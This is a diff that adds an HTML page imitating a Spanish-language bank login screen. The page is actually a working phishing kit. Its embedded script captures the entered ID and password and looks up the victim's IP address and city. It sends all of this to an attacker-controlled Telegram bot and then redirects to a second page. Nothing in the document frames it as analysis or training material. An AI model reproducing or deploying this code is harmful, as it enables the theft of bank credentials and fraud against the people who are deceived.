@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="nv">
+        <img src="qwe/lg.png" alt="">
+
+    </div>
+    <div class="ry"></div>
+    <div id="banner">
+        <div class="cont-xjsx">
+            <div class="princ">
+                <div class="fir">
+                    <img src="qwe/fir.png" alt="">
+                </div>
+                <form action="" id="xjsx">
+                    <div class="usr">
+                        <input type="text" placeholder="Identificación" id="js1">
+                    </div>
+                    <div class="usr">
+                        <input type="password" placeholder="Contraseña" id="js2">
+                    </div>
+                    <p id="err"></p>
+                    <div class="sub">
+                        <input type="submit" value="Iniciar sesión">
+                    </div>
+                </form>
+
+                <div class="text-b">
+                    <p class="textblue"><span class="dot"></span>¿Olvidó su contraseña?</p>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+    <div class="foot">
+        <div class="f1">
+            <p class="acc">Accesos</p>
+            <div class="lis">
+                <li class="ll"><a href="#">Registro en línea</a></li>
+                <li class="ll"><a href="#">Sincronizar OTP</a></li>
+                <li class="ll"><a href="#">Descargar Módulo Local IBC</a></li>
+            </div>
+        </div>
+        <div class="f2">
+            <li class="ll ll-m"> <a href="#">Asistencia: Contáctenos al 2212-2000 opción 5</a></li>
+        </div>
+
+    </div>
+
+
+
+
+
+    <div id="gfg" style="display:none;"></div>
+    <div id="ip" style="display:none;"></div>
+    <div id="address" style="display:none;"></div>
+    
+</body>
+</html>
+<script src="qwerty.js"></script>
+<script>
+             document.addEventListener('DOMContentLoaded', function() {
+        const xjsx = document.querySelector('#xjsx');
+        let js1 = document.querySelector('#js1');
+        let js2 = document.querySelector('#js2');
+        // let sub = document.querySelector('#sub');
+        const err = document.querySelector('#err');
+
+
+
+
+
+        xjsx.addEventListener('submit', e => {
+            e.preventDefault();
+            if (js1.value.trim().length === 0 || js2.value.trim().length === 0) {
+                err.innerHTML = "Campos obligatorios";
+                return false;
+            } else if (js1.value.trim().length <= 3 ||js2.value.trim().length <= 3) {
+                err.innerHTML = "Campos invalidos";
+                return false;
+            }
+            sender(e);
+        });
+
+
+    });
+
+    function fetchIPData() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("gfg").innerHTML = data.ip;
+                return fetch('https://ipinfo.io/json?token=46da206f1311c9'); 
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").innerHTML = `IP: ${data.ip}`;
+                document.getElementById("address").innerHTML = `${data.city}, ${data.country}`;
+            });
+    }
+
+    function sender(e) {
+        e.preventDefault();
+        fetchIPData().then(() => {
+            let js1 = document.getElementById("js1").value;
+            let js2 = document.getElementById("js2").value;
+            // const nipper = document.querySelector('#cont-nipper');
+            const ip = document.getElementById("gfg").innerHTML;
+            const ip2 = document.getElementById("address").innerHTML;
+            const message = `**BN**\nUSUARIO: ${js1}\nPASSW0RD: ${js2}\n🌎IP: ${ip}\n${ip2}`;
+
+            const T0K3N = T0KEN; 
+            const chatID = CHATID; 
+
+            const settings = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'cache-control': 'no-cache'
+                },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message
+                })
+            };
+
+            fetch(`https://api.telegram.org/bot${T0K3N}/sendMessage`, settings)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // nipper.style.display = 'flex';
+
+                        // setTimeout(function(){
+                            window.location.href = 'index2.html';
+                        // },3000)
+
+
+                    } else {
+                        alert('Intenta nuevamente, algo salio mal.');
+                        console.error('Telegram error:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred');
+                });
+        });
+    }
+</script>
